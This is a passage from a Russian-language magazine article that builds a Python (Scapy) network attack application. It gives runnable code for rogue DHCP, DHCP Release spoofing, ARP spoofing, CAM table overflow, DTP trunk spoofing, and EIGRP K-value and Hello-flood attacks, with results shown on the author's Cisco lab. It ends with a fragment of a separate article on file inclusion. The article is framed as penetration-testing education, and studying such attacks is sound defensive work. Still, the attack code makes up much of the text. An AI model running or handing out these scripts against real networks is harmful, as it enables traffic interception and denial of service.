database? Объяснение простое: если устройство клиента ранее получало IP-
адрес от другого DHCP-сервера, то при следующей инициализации DHCP
(например, при включении устройства) оно попытается запросить уже арен‐
дованный у прежнего сервера IP-адрес, прежде чем принять новое пред‐
ложение.
   Выглядит это следующим образом:
 1. Клиент отправляет сообщение DHCP DISCOVER с запрашиваемым ранее
   IP-адресом.
 2. Новый DHCP-сервер шлет ему DHCP OFFER с предложенным (отличным
   от запрашиваемого) IP-адресом.
 3. Клиент игнорирует предложение нового сервера, и пункты 1–2 повторя‐
   ются.
 4. Не нашедший прежнего DHCP-сервера клиент принимает предложение
   от нового сервера.





Вот поэтому я сделал проверку на наличие MAC-адреса клиента в словаре
database: чтобы одному и тому же клиенту не выдавать несколько разных IP-
адресов. Ведь без такой проверки на каждое сообщение DISCOVER одного
клиента будет выделяться по одному IP-адресу из пула pool.
   Итак, мы с тобой рассмотрели блок кода, который обрабатывает сооб‐
щения DISCOVER, а теперь посмотрим на обработчик сообщений REQUEST:


# Опция 3 — DHCP Request
if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 3:
    def mac_to_bytes(mac_addr: str) -> bytes:
        return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")


    for option in packet[DHCP].options:
        if option[0] == 'server_id':
                # Сохраняем IP-адрес DHCP-сервера, которому был
отправлен пакет DHCP Request
            server_id = option[1]


    if server_id == ip_dhcp_server:
        for option in packet[DHCP].options:
            if option[0] == 'requested_addr':
                    # Сохраняем запрашиваемый IP-адрес
                requested_address = option[1]
        mac_address = packet[Ether].src
        xid = packet[BOOTP].xid


        ack_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                     IP(src=ip_dhcp_server, dst="255.255.255.255") /
\
                     UDP(sport=67, dport=68) / \
                     BOOTP(op=2, chaddr=mac_to_bytes(mac_address),
xid=xid, yiaddr=requested_address, siaddr=ip_dhcp_server) / \
                     DHCP(options=[("message-type", "ack"), ("
server_id", ip_dhcp_server), ("router", gateway),
                     ("name_server", dns), ("subnet_mask",
subnet_mask), ("lease_time", int(lease_time)),
                     ("domain", domain_name), "end"])
        sendp(ack_packet, iface=interface, count=1)
        # Минус один свободный IP-адрес из пула
        count -= 1

Здесь мы проверяем, что сообщение REQUEST было отправлено именно
нам, а не другому DHCP-серверу (if server_id == ip_dhcp_server:), сох‐
раняем запрашиваемый IP-адрес и отправляем клиенту последнее сооб‐
щение ACK.





  Интерфейс Rogue DHCP после того, как пользователь нажал кнопку Start

Здесь указывается номер позиции (сколько IP-адресов было выдано кли‐
ентам), MAC-адрес клиента и присвоенный ему IP-адрес из нашего пула. Таб‐
лица, естественно, заполняется в реальном времени.





  Сетевые настройки клиента, который получил их от нашего Rogue-сер‐
  вера


DHCP Release Spoofing
Пришло  время  поговорить про еще одну  недоатаку — DHCP Release
Spoofing. Все говорят о DHCP Starvation и Rogue DHCP, что эти две атаки вза‐
имосвязаны, что сперва должна проводиться атака DHCP Starvation, а пос‐
ле — Rogue DHCP. Но никто не упоминает немаловажную атаку DHCP Release
Spoofing.
   Что такое DHCP Release Spoofing? Это спуфинг пакетами DHCP Release.
А что такое пакет DHCP Release? Это сообщение, посылаемое от клиента
к серверу DHCP, которое сообщает серверу, что клиент больше не хочет
использовать выданный ему IP-адрес (и другие сетевые параметры) и хочет
от него отказаться. Тогда DHCP-сервер удаляет этот IP-адрес из своей таб‐
лицы DHCP (возвращает его в пул свободных адресов) и в дальнейшем
может предложить его другим клиентам. Это происходит, когда ты, например,
указываешь в настройках статический IP-адрес или вводишь в командной
строке такую команду (вариант для Windows):


ipconfig /release

Вариант для Linux:


sudo dhclient -r <сетевой интерфейс>

Атакующий может использовать DHCP Release Spoofing для отправки сооб‐
щений DHCP RELEASE от имени легитимных клиентов серверу, чтобы он
освободил используемые клиентами IP-адреса и вернул их в пул незанятых
адресов.
  Но в чем смысл этой атаки? Ведь ее и атакой‑то сложно назвать: сооб‐
щения сервер получит и адреса вернет в пул, но для клиентов ничего
не изменится. Они как использовали эти адреса, так и будут использовать
до истечения времени их аренды, а потом заново получат от DHCP-сервера
их или какие‑то другие адреса. Ведь сами клиенты ни от каких IP-адресов
не отказывались.
   Дело в том, что атака DHCP Release должна проводиться в связке с пре‐
дыдущими двумя. Представь ситуацию: есть корпоративная сеть, где работа‐
ет сотня устройств, они получают IP-адреса от легитимного DHCP-сервера.
Допустим, пул DHCP-сервера рассчитан на 254 адреса (24-я маска). Соот‐
ветственно, оставшиеся примерно 150 адресов мы забираем из пула сво‐
бодных при помощи DHCP Starvation. Всё! Легитимный сервер мы положили,
разворачиваем поддельный сервер Rogue DHCP. Только вот мы не получим
от клиентов запросы на аренду, потому что они продолжают использовать IP-
адреса легитимного DHCP-сервера, у которого эти IP-адреса занесены
в таблицу занятых, и по истечении аренды клиенты снова могут их продлить
у прежнего DHCP-сервера.
   Вот мы и подобрались к сути атаки DHCP Release Spoofing. Атакующий
должен проводить ее самой первой из трех, чтобы заранее освободить все
занятые IP-адреса. Ведь после этого таблица соответствий будет пустой
и все даже занятые в настоящий момент клиентами IP-адреса станут свобод‐
ными для легитимного DHCP-сервера. И только когда у DHCP-сервера все
адреса из пула будут свободными, появится смысл проводить атаку DHCP
Starvation, а после — Rogue DHCP.
   Встает вопрос: что нужно, чтобы реализовать спуфинг пакетами RELEASE?
Ответ: нужно знать MAC-адрес клиента, его IP-адрес (если известен MAC, то,
соответственно, известен и IP), а также MAC- и IP-адрес DHCP-сервера.
Ничего сложного. IP-адрес DHCP-сервера обычно такой же, как у шлюза
по умолчанию. А для получения MAC-адресов есть старенький и известный
протокол, чья работа и заключается в резолве IP- и MAC-адресов, — ARP.
Начнем.





                               Окно для атаки

Обрабатываем ввод пользователя:


start_host = entry_dhcp_release_start_ip.get().split(".")[-1]
end_host = entry_dhcp_release_end_ip.get().split(".")[-1]
subnet = entry_dhcp_release_start_ip.get().split(".")[0:3]
subnet = subnet[0] + "." + subnet[1] + "." + subnet[2] + "."
sum = (int(end_host) - int(start_host)) + 1
start_host = int(start_host)
dhcp_server_ip = entry_dhcp_release_dhcp_server_ip.get()

Здесь мы определяем адрес сети, первый и последний адреса, а также
количество IP-адресов в указанном диапазоне.
   Далее формируем ARP-запрос, чтобы узнать MAC-адрес DHCP-сервера:


# Отправляем ARP-запрос DHCP-серверу, чтобы узнать его MAC-адрес
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=
dhcp_server_ip)


result = srp1(arp_request, timeout=1, verbose=False)
if result:
    for received in result:
        if received.haslayer(ARP) and received[ARP].op == 2:
            dhcp_server_mac = received.hwsrc

Если DHCP-сервер  ответил, записываем его MAC-адрес в переменную
dhcp_server_mac.
   Создаем  пустой  список dhcp_release_pool,  устанавливаем позицию
в списке (position) на ноль, обнуляем счетчик отправленных пакетов и фор‐
мируем список IP-адресов, от имени которых будут отправляться сообщения
DHCP RELEASE:


dhcp_release_pool = []
position = 0
sent_packets = 0


for i in range(sum):
    dhcp_release_pool.append(subnet + str(start_host))  # Формируем
список с IP-адресами
    start_host += 1

Осталось запустить цикл, который будет по очереди через ARP узнавать
MAC-адрес клиента, а после от имени этого клиента отправлять DHCP-сер‐
веру сообщение DHCP RELEASE:


for i in range(sum):
        # Узнаем MAC-адрес клиента
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=
dhcp_release_pool[position])
    result = srp1(arp_request, timeout=1, verbose=False)


    if result:
        for received in result:
            if received.haslayer(ARP) and received[ARP].op == 2:
                    # Получаем MAC-адрес клиента
                client_mac = received.hwsrc


                def mac_to_bytes(mac_addr: str) -> bytes:
                    return int(mac_addr.replace(":", ""), 16).
to_bytes(6, "big")


                xid = random.randint(0x00000000, 0xffffffff)
                release_packet = Ether(src=client_mac, dst=
dhcp_server_mac) / \
                                 IP(src=dhcp_release_pool[position],
dst=dhcp_server_ip) / \
                                 UDP(sport=68, dport=67) / \
                                 BOOTP(op=1, chaddr=mac_to_bytes(
client_mac), ciaddr=dhcp_release_pool[position], xid=xid) / \
                                 DHCP(options=[("message-type", "
release"), ("client_id", b'\x01' + bytes.fromhex(client_mac.replace('
:', ''))), ("server_id", dhcp_server_ip), "end"])
                sendp(release_packet, count=1)
                # Для Release (заголовок BOOTP) opcode указывается,
как в Request (op=1)

Цикл for пройдется по каждому IP-адресу из списка dhcp_release_pool,
который мы сформировали на основе начального и конечного IP-адресов,
указанных пользователем.





                Интерфейс атаки DHCP Release Spoofing

Сейчас я покажу, как работает эта атака в Salmonella. Сперва проверим таб‐
лицу DHCP на моем роутере Cisco.





Всего занято три адреса. Теперь запустим атаку, введя в поле Start IP
192.168.1.2, в поле End IP — 192.168.1.140, а в поле DHCP server IP ука‐
жем 192.168.1.1. Посмотрим на трафик в Wireshark.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

 СЕТЕВЫЕ ПРОТОКОЛЫ
  ПОД МИКРОСКОПОМ
       РЕАЛИЗУЕМ АТАКИ НА DHCP, EIGRP,
              DTP И ARP В ПРИЛОЖЕНИИ
                         НА PYTHON




Тут видно, что мы опрашиваем каждый хост из диапазона через ARP, и если
мы получаем ответ, то от имени этого хоста отправляем сообщение DHCP
RELEASE.
   После запуска нижняя часть интерфейса (scrollable frame) начинает запол‐
няться по мере отработки кода.





                Порядковый номер, IP и MAC клиентов, статус

Статус может быть Successfully (когда мы получили от клиента MAC-адрес
и отправили от его имени сообщение DHCP RELEASE) и Not answer (когда
клиент не отвечает на ARP Request и, соответственно, сообщение DHCP
RELEASE не отправлено).
   Кстати, на скриншоте выше говорится, что было отправлено четыре пакета
DHCP RELEASE? — не обращай внимания, код нашел четвертый айпишник
на моем коммутаторе, на котором он задан вручную.
   Теперь снова смотрим на таблицу DHCP на роутере.





Вуаля! Все IP-адреса, которыми в настоящий момент пользуются устройства,
освобождены и могут быть зарезервированы через атаку DHCP Starvation,
чтобы в дальнейшем вынудить клиентов использовать наш поддельный сер‐
вер Rogue DHCP.


ARP

Немного расслабимся и вкратце поговорим про более простой и более лег‐
кий в плане пентеста протокол — ARP. А конкретно про атаку ARP Spoofing.
Думаю, нет смысла подробно о ней рассказывать, да и рассказывать там осо‐
бо нечего: злоумышленник, манипулируя всего одним сообщением ARP,
представляется шлюзом по умолчанию и таким образом может перех‐
ватывать трафик.
   Посмотрим на интерфейс ARP Spoofing, там все просто и минималис‐
тично.





Вводим IP-адреса жертвы и шлюза по умолчанию, жмем Start.





Поля Victim’s MAC address и Gateway MAC address заполняются сами
и нужны просто для информативности.
   Как реализовать ARP Spoofing? Получаем ввод от пользователя, передаем
в переменные victim_ip и gateway_ip и отправляем ARP Request, чтобы
узнать MAC-адрес жертвы:


victim_ip = entry_arp_spoofing_victim_ip.get()
gateway_ip = entry_arp_spoofing_gateway_ip.get()


arp_request_for_victim = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                         ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=
victim_ip)
result = srp1(arp_request_for_victim, timeout=2, verbose=False)


if result:
    for received in result:
        if received.haslayer(ARP) and received[ARP].op == 2:
            victim_mac = received.hwsrc

Узнали MAC-адрес и записали в переменную victim_mac. То же делаем и для
MAC-адреса шлюза:


arp_request_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                          ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=
gateway_ip)


result = srp1(arp_request_for_gateway, timeout=2, verbose=False)


if result:
    for received in result:
        if received.haslayer(ARP) and received[ARP].op == 2:
            gateway_mac = received.hwsrc

Теперь мы знаем канальные адреса и того и другого и можем отправить ARP
Response (ответ без запроса):


garp_packet = Ether(dst=victim_mac) / \
              ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=
victim_mac)
sendp(garp_packet)

После отправки юникастового ARP Response жертва в своей ARP-таблице
изменит запись для шлюза по умолчанию, где укажет MAC-адрес атакующего.
Периодически жертва также через юникаст будет опрашивать атакующего
с целью узнать, не поменялся ли у него MAC-адрес, и мы, конечно же, должны
отвечать:


while True:
    def analyze(packet):
        if packet.haslayer(ARP):
            if packet[ARP].op == 1 and packet[ARP].pdst == gateway_ip
and packet[ARP].hwsrc == victim_mac:
                arp_response = Ether(dst=victim_mac) / \
                               ARP(op=2, psrc=gateway_ip, pdst=
victim_ip, hwdst=victim_mac)
                sendp(arp_response)


    sniff(filter="arp", prn=analyze, count=1)

Зацикливаем захват ARP-пакетов и проверяем каждый. Если это запрос
от нашей жертвы, то отвечаем ей ARP REPLY.





Такой метод «вопрос — ответ» при ARP-спуфинге хорош тем, что мы не спа‐
мим необоснованными ответами ARP REPLY в сторону жертвы.





                      ARP-таблица жертвы до атаки





                                После атаки


CAM TABLE OVERFLOW

Атака CAM (Content Addressable Memory) Table Overflow, или переполнение
таблицы коммутации, применима только к коммутаторам, которые формиру‐
ют и используют для форвардинга кадров таблицу MAC-адресов.
   Таблица выглядит примерно так.


 Port      MAC address

 1             11-22-33-44-55-66

 2            77-88-99-00-AA-BB

Чтобы понять суть атаки, нужно немного разобраться с таблицей MAC-адре‐
сов. Заранее хочу отметить, что термины «CAM-таблица», «MAC-таблица»
и «таблица MAC-адресов» — синонимы.
   Итак, эту таблицу ведет коммутатор, когда с его порта отправляется кадр
или пакет. Для соответствующего порта в таблице он добавляет значение
MAC-адреса источника кадра или пакета, который покинул этот порт.
  К одному порту коммутатора может быть подключено несколько устройств
(например, через еще один коммутатор). Соответственно, в таблице MAC-
адресов напротив одного порта могут быть записаны несколько MAC-адре‐
сов.
  В мире нет ничего бесконечного, и таблица MAC-адресов не исключение.
У разных моделей коммутаторов размер таблицы может отличаться. Бывают
таблицы в 1000 записей, а бывают и в 64 000 записей.
   Давай посмотрим объем MAC-таблицы на моем коммутаторе Cisco 2960.





Почти 7400 записей. На самом деле на этом коммутаторе допустимый объем
составляет 8000 записей. Но это не так важно, идем дальше.
   Иногда таблица MAC-адресов переполняется. Тогда коммутатор перес‐
тает использовать ее для маршрутизации пакетов и вместо этого отправляет
их со всех портов. Такая ситуация создает идеальные условия для проведе‐
ния MITM-атак.
   Суть атаки CAM Table Overflow заключается как раз в злонамеренном
переполнении MAC-таблицы  коммутатора. Желательно,  чтобы это была
лавинная рассылка, ведь таблицы MAC-адресов современных коммутаторов
не такие уж и маленькие. При этом не важно, какие данные ты отправляешь
в сеть, — в таблицу MAC-адресов все равно попадет MAC-адрес твоего
устройства.
  И тут я задался вопросом: какие именно пакеты нужно сформировать
для их последующей отправки, чтобы переполнить таблицу? Я сразу отбросил
те, которые используют broadcast и multicast, так как от пакетов с такой рас‐
сылкой есть противоядие — Storm Control. Значит, используем unicast. Я
решил отправлять TCP-пакеты, которые на фоне другого пользовательского
трафика будут выглядеть незаметно.
  Код вышел совсем небольшой:


while True:
    src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range
(4))))
    dst_ip = ".".join(map(str, (random.randint(0, 255) for _ in range
(4))))
    src_mac = RandMAC()
    dst_mac = RandMAC()


    fake_packet = Ether(src=src_mac, dst=dst_mac) / IP(src=src_ip,
dst=dst_ip) / TCP(sport=RandShort(), dport=80)
    sendp(fake_packet, count=1)

Все просто: генерируем IP-адреса источника и назначения, MAC-адреса
источника и назначения, создаем пакет и отправляем его. Этот процесс
зацикливаем.
   Теперь запустим эту атаку и посмотрим, что будет. Интерфейс — из раз‐
ряда «пока так».





                 Жмем Start, и все работает





                      Как это выглядит в Wireshark

Теперь проверим результат атаки, заглянув в MAC-таблицу коммутатора.





Результат положительный! Утилита работала всего около минуты, и таблица
MAC-адресов переполнена.


DTP SPOOFING

DTP (Dynamic Trunking Protocol) — фирменный протокол Cisco, используемый
для автоматического согласования портов коммутаторов и настройки тран‐
кового режима. Давай для начала разберем, какие вообще бывают режимы
DTP на коммутаторах Cisco.
 1. Access (режим доступа) — задается вручную администратором, передает
   только нетегированный трафик и обычно используется на портах, подклю‐
   ченных к конечным устройствам (клиентам). Ручная установка режима
   Access исключает его переход в режим Trunk.
 2. Trunk, как и режим Access, устанавливается вручную, но передает уже
   тегированный трафик и используется в соединениях между коммутато‐
   рами. Заданный вручную режим Trunk никогда не перейдет в режим
   Access.
 3. Dynamic Auto — режим, установленный по умолчанию на всех портах
   коммутатора. Проще говоря, он автоматически подстраивается под нас‐
   тройки соседнего порта: он принимает режим Trunk или Access в зависи‐
   мости от конфигурации соседа.
 4. Dynamic Desirable — режим, который активно пытается договориться
   с соседним портом о настройке Trunk. Однако, если соседний порт нас‐
   троен как Access, он согласится работать в режиме Access.

Точно определить поведение соседних портов можно при помощи таблицы.


              Dynamic    Dynamic
                                           Trunk     Access
               Auto        Desirable

 Dynamic Auto   Access        Trunk               Trunk       Access

 Dynamic
                  Trunk         Trunk               Trunk       Access
  Desirable

                                               No
  Trunk            Trunk         Trunk               Trunk        connectio
                                                        n

                                      No
 Access         Access       Access            connectio   Access
                                             n

Trunk — это соединение между двумя коммутаторами или между коммутато‐
ром и маршрутизатором, которое передает трафик из всех VLAN. Например,
если ты подключен к сети VLAN 10, то имеешь доступ только к этой сети.
А если подключен к транковому каналу, у тебя есть доступ ко всем VLAN.
Под доступом я имею в виду возможность взаимодействовать с устройства‐
ми, прослушивать трафик и выполнять другие действия.
   Получается, что, подключившись к транковому каналу, ты будешь иметь
доступ ко всем VLAN, тогда как по факту у тебя его быть не должно.
   Коммутаторы  согласовывают  порты,  обмениваясь сообщениями  DTP,
которые по умолчанию отправляются каждые 30 секунд.
  По умолчанию на всех портах коммутатора включен режим Dynamic Auto.
Это значит, что если на втором коммутаторе включен такой же режим, то оба
порта будут работать в режиме Access. Но что, если мы прикинемся ком‐
мутатором и уговорим соседа установить между нами транк? Тогда мы
получим доступ к транковому каналу и сможем взаимодействовать со всеми
сетями VLAN. Так и сделаем!
  Но сперва разберемся с некоторыми понятиями. На коммутаторе, порт
Fa0/48 которого мы планируем обмануть и перевести в режим Trunk, выпол‐
ним команду sh int f0/48 switchport.





Обрати  внимание  на  строчки Administrative  Mode:  dynamic  auto
и Operational Mode: static access. Первая строчка говорит о том, что
администратор указал режим dynamic auto. Вторая строчка говорит, что
по факту порт работает в режиме static access. Запомнили эти состояния.
   То же самое мы можем увидеть в Wireshark.





Кстати, на скриншоте есть поле Domain: local_domain — это имя домена,
которое берется из конфигурации протокола VTP.
   Теперь для чистоты эксперимента проверим, есть ли у нас активные тран‐
ковые порты.




Таковых нет.
  Для начала сформируем цисковский MAC-адрес, из‑под которого мы
будем отправлять сообщения DTP:


cisco_mac = "00:25:2e:"
mac = [random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random
.randint(0x00, 0x7f)]
mac_for_dtp = ':'.join(map(lambda x: '%02x' % x, mac))
mac_for_dtp = cisco_mac + mac_for_dtp

Это нужно, чтобы коммутатор нормально воспринимал наши сообщения DTP.
Про формирование таких «правильных» MAC-адресов я уже рассказывал
в разделе про DHCP.
   Теперь сформируем DTP-кадр:


dtp_packet = (Dot3(src=mac_for_dtp, dst="01:00:0c:cc:cc:cc") /
              LLC(dsap=0xaa, ssap=0xaa) / SNAP(OUI=0x0c, code=0x2004)
/
              DTP(tlvlist=[DTPDomain(), DTPStatus(status=b'\x03'),
DTPType(dtptype=b'\xa5'), DTPNeighbor(neighbor=mac_for_dtp)]))

Сообщения DTP отправляются на цисковский мультикастовый MAC-адрес
Cisco 01:00:0c:cc:cc:cc. На этот же адрес идет и трафик протоколов CDP, VTP
и PAgP. Для их разделения используется поле SNAP «протокол». Для CDP
в нем будет значение 0x2000, для VTP — 0x2003, для DTP — 0x2004. Также
видим следующие заголовки:
 1. Подзаголовок LLC — это  «верхний» подуровень  канального  уровня,
   содержащий SSAP/DSAP-коды 0xAA, которые указывают, что далее идет
   SNAP-вложение.
 2. Подзаголовок SNAP (Subnetwork Access Protocol) указывает, что дальше
   следует не заголовок сетевого уровня, а разделение на субпротоколы
   канального уровня. В данном случае SNAP сообщает, что вложен про‐
   токол,   идентифицируемый   как   Cisco-протокол  DTP    (OUI=0x0c,
  code=0x2004).
 3. DTPStatus(status=b'\x03') — это обозначение режима Dynamic
   Desirable (оно нужно, чтобы заставить соседний порт согласовать транк).
 4. DTPType(dtptype=b'\xa5') — тут мы указываем, что будем исполь‐
   зовать инкапсуляцию 802.1Q.

Теперь важный момент: мы не отправляем один DTP-пакет, а зацикливаем их
отправку. Это нужно, потому что динамически согласованный транк имеет
ограниченное время жизни, по умолчанию пять минут. Поэтому мы будем
регулярно отправлять DTP-пакеты, чтобы поддерживать состояние транка
и предотвратить его переход обратно в режим Access в самый неподходящий
момент.


sendp(dtp_packet, loop=1, inter=5)

Опять смотрим Wireshark.





Видно, что после нашего DTP-пакета соседний коммутатор отправил свой
DTP-пакет, где Operational Mode уже выставлен в Trunk. Проверим это на
самом коммутаторе.





Теперь порт Fa0/48 согласовал режим Trunk, хотя Administrative Mode все так
же выставлен как Dynamic Auto. Напоследок проверим активные порты Trunk
на коммутаторе.





EIGRP

EIGRP Poisoning
EIGRP Poisoning, или отравление EIGRP, — это атака, при которой роутерам
EIGRP отправляются ложные маршруты, чтобы «загрязнить» их таблицы мар‐
шрутизации. Эта атака может привести к таким последствиям:
 • отказ в обслуживании. Ложные маршруты в таблице маршрутизации могут
   нарушить нормальную работу маршрутизации и всей сети;
 • перехват трафика. Достаточно анонсировать маршрут с устройством зло‐
   умышленника в качестве адреса следующего перехода (Next Hop), чтобы
   весь трафик проходил через него.

Про EIGRP, его сообщения, структуру заголовка и отравление таблицы мар‐
шрутизации я уже писал в статье «EIGRP Scam». Повторяться не буду, смысл
атаки, да и код остались без изменений. Покажу лишь обновленный гра‐
фический интерфейс.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

 СЕТЕВЫЕ ПРОТОКОЛЫ
  ПОД МИКРОСКОПОМ
       РЕАЛИЗУЕМ АТАКИ НА DHCP, EIGRP,
              DTP И ARP В ПРИЛОЖЕНИИ
                         НА PYTHON




Все практически то же самое: самый левый фрейм — параметры найденного
маршрутизатора EIGRP, которые мы будем использовать для установления
соседства и отправки обновлений, в центральном фрейме мы формируем
EIGRP-анонс.
   Правый фрейм — моя новая задумка. После каждого нажатия на кнопку
Update мы отправляем в сеть сообщение EIGRP Update. Так вот, чтобы можно
было убедиться, что соседний роутер получил это обновление, я и добавил
этот фрейм. Если соседний роутер в ответ отправил пакет подтверждения
ACK, то все в порядке, значит, он добавил наш маршрут к себе в таблицу.
В правом фрейме тогда появится запись с отправленным маршрутом и ста‐
тусом OK. Если пакет подтверждения не пришел, значит, статус будет ERR.


Злоупотребление K-значениями EIGRP
До недавнего времени я не знал об этой атаке на EIGRP, возможно, и ты тоже
не в курсе.
   Начнем с теории. K-коэффициенты (или K-значения) в EIGRP используют‐
ся для вычисления метрик маршрутов. EIGRP по сложной формуле определя‐
ет стоимость маршрута на основе нескольких параметров, таких как скорость
соединения (K1), нагрузка (K2), задержка (K3), надежность (K4, K5) и MTU.
  Для установления и поддержания соседства у маршрутизаторов EIGRP
должны быть одинаковые значения K-коэффициентов. То есть если в момен‐
те K-значения поменяются, то соседство между роутерами прекратится
и маршрутизация между ними будет нарушена. Теперь вопрос: что мы
для этого можем сделать? Очень просто! Мы можем отправлять пакеты Hello
с неправильными K-коэффициентами от имени легитимных роутеров, тогда
соседство между ними будет нарушено.
   Однако есть одно ограничение: маршрутизаторы должны быть подклю‐
чены к тому же коммутатору, что и злоумышленник. Если же маршрутизаторы
соединены напрямую, злоумышленник должен каким‑то образом вклиниться
между ними (например, с помощью SharkTap Gigabit Network Sniffer, хотя
это уже мои предположения).





Допустим, роутеры соединены друг с другом через коммутаторы. Запускаем
атаку EIGRP Abusing K-values.





Вот что происходит за кадром:


eigrp_routers = {}


def packet_callback(packet):
    if packet.haslayer(EIGRP):
        src_mac = packet[Ether].src
        src_ip = packet[IP].src
        asn = packet[EIGRP].asn
        if src_mac in [router["MAC"] for router in eigrp_routers.
values()]:
            pass
        else:
            eigrp_routers[f"Router{router_count}"] = {"MAC": src_mac,
"IP": src_ip, "AS": asn}



sniff(filter="proto 88", prn=packet_callback, timeout=15)

Сначала создаем пустой словарь eigrp_routers. Затем в течение 15 секунд
прослушиваем EIGRP-пакеты в сети. Если такие пакеты обнаружены, добав‐
ляем в словарь соответствующие связки MAC- и IP-адресов, а также номер
автономной системы. Это позволит нам позже отправлять от имени этих
роутеров некорректные Hello-пакеты.
   Дальше дело за малым — мы просто запускаем цикл, в каждой итерации
которого от имени каждого роутера отправляем по одному поддельному
пакету Hello:


while True:
    for router in eigrp_routers:
        mac_address = eigrp_routers[router]['MAC']
        ip_address = eigrp_routers[router]['IP']
        asn = eigrp_routers[router]['AS']


        fake_hello_packet = Ether(src=mac_address, dst="01:00:5e:00:
00:0a") / \
                            IP(src=ip_address, dst="224.0.0.10", ttl=
2) / \
                            EIGRP(opcode=5, asn=asn) / \
                            EIGRPParam(k1=random.randint(0, 1), k2=
random.randint(0, 1), k3=random.randint(0, 1), k4=random.randint(0, 1
), k5=random.randint(0, 1)) / \
                            EIGRPSwVer()
        sendp(fake_hello_packet)
    time.sleep(2)

Не нужно устраивать лавинную рассылку Hello-пакетов, достаточно отправ‐
лять их чаще, чем это делают сами роутеры. По умолчанию они отправляют
Hello-пакеты каждые 5 секунд. Поэтому после отправки одного ложного
пакета Hello от имени каждого роутера делаем паузу в 2 секунды, после чего
повторяем итерацию. Кстати, я решил отправлять в пакетах Hello рандомные
K-значения, так намного проще.
   Посмотрим, что у нас происходит в Wireshark.





Вроде бы ничего необычного: два роутера просто обмениваются приветстви‐
ями, иногда какими‑то обновлениями.
   Откроем консоль и попробуем посмотреть состояние сосед…





Погоди, здесь творится какая‑то вакханалия! Вот и результат злоупотребле‐
ния K-значениями. Я поясню, что здесь происходит.
 1. Роутеры спокойно обменивались своими Hello-пакетами с одинаковыми
   K-коэффициентами.
 2. Тут пришли мы и от имени каждого из этих двух роутеров начали слать
   ложные пакеты Hello с неправильными K-значениями.
 3. В итоге роутеры разрывают соседство друг с другом, вдобавок присылая
   в  консоль  логи  Neighbor  192.168.1.3  is  down:  K-value
  mismatch.
 4. Однако они не перестают отправлять друг другу свои, не поддельные
   сообщения Hello и видят, что вроде как K-коэффициенты стали одинако‐
   вые. Тогда они снова устанавливают соседство: Neighbor 192.168.1.3
  is up: new adjacency. Но мы снова спустя две секунды отправляем
   неправильные Hello-сообщения, и ситуация повторяется.





    Тут я пытался попасть в тайминг и отобразить таблицу соседей EIGRP

Хочу сделать вывод, что атака EIGRP Abusing K-values направлена исклю‐
чительно на отказ в обслуживании. При этой атаке маршрутизация между
роутерами становится практически невозможной, а ведь интервал между
отправкой поддельных пакетов Hello можно еще сократить.


EIGRP Hello Flooding
Еще одна атака на EIGRP, которую я реализовал в Salmonella, — EIGRP Hello
Flooding. Я думаю, из названия понятно, что она будет делать, но на всякий
случай скажу. С помощью этой атаки злоумышленник сможет навести хаос
как в таблице соседей, так и в логах. Мы будем генерировать огромное
количество фейковых Hello-пакетов EIGRP, в которых MAC- и IP-адреса
источника будут рандомными. Реализация этой атаки совсем несложная.





                    Интерфейс EIGRP Hello Flooding

Жмем на кнопку Sniff, и запускается уже знакомый код, который прослушивает
сеть на наличие пакетов EIGRP. Основная цель — определить, какие K-коэф‐
фициенты используют маршрутизаторы и какая автономная система на них
настроена.


def analyze_packet(packet):
    global target_mac, target_ip, autonomous_system, k1, k2, k3, k4,
k5, hold_time
    if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 5:
        target_mac = packet[Ether].src
        target_ip = packet[IP].src
        autonomous_system = packet[EIGRP].asn
        k1 = packet[EIGRPParam].k1
        k2 = packet[EIGRPParam].k2
        k3 = packet[EIGRPParam].k3
        k4 = packet[EIGRPParam].k4
        k5 = packet[EIGRPParam].k5
        hold_time = packet[EIGRPParam].holdtime


sniff(filter="ip proto 88", prn=analyze_packet, count=1)

Следом запускается бесконечный цикл, который флудит сформированными
нами Hello-пакетами EIGRP:


while True:
    src_ip = target_ip.split('.')
    src_ip = src_ip[0] + "." + src_ip[1] + "." + src_ip[2] + "." +
str(random.randint(0, 255))
    src_mac = RandMAC()


    fake_hello_packet = Ether(src=src_mac, dst="01:00:5e:00:00:0a") /
\
                        IP(src=src_ip, dst="224.0.0.10", ttl=2) / \
                        EIGRP(opcode=5, asn=autonomous_system) / \
                        EIGRPParam(k1=k1, k2=k2, k3=k3, k4=k4, k5=k5)
/ \
                        EIGRPSwVer()
    sendp(fake_hello_packet)

Важно генерировать IP-адреса из той же сети, где находится интерфейс мар‐
шрутизатора, на который будут  отправляться  Hello-пакеты. MAC-адреса
при этом могут быть случайными.
   Вот, собственно, и весь код. Перед запуском проверим таблицу соседей.





Тут все пусто, соседей нет. Запускаем!





Как и в случае с атакой EIGRP Abusing K-values, в консоль приходит множес‐
тво сообщений о том, что на интерфейсе G0/1 появился новый сосед EIGRP.





Конечно же, посмотрим на таблицу соседей.





И да, важно не прекращать флуд пакетами Hello, так как каждый пакет отправ‐
ляется только один раз, а через Dead Interval запись о новом соседе удалится
из таблицы.





ВЫВОДЫ

В этой статье мы с тобой рассмотрели, как правильно и надолго положить
легитимный DHCP-сервер на лопатки, отравили ARP-кеш, согласовали транк
с коммутатором по DTP и навели хаос в домене маршрутизации EIGRP. В сле‐
дующих материалах я планирую реализовать атаки на другие сетевые про‐
токолы и добавлю их в свое приложение, а также поработаю над поддержкой
IPv6, Wi-Fi и над другими занятными вещами.
ВЗЛОМ





Баги, связанные с включением файлов (File
Inclusion)   и   обходом   путей    (Path
Traversal), — одни из самых критических
в веб‑безопасности, поскольку позволяют
читать и выполнять файлы. В этой статье мы      Huseyn (az_AZ) Gadashov                                                                                       xdvyznq28qfn@proton.me
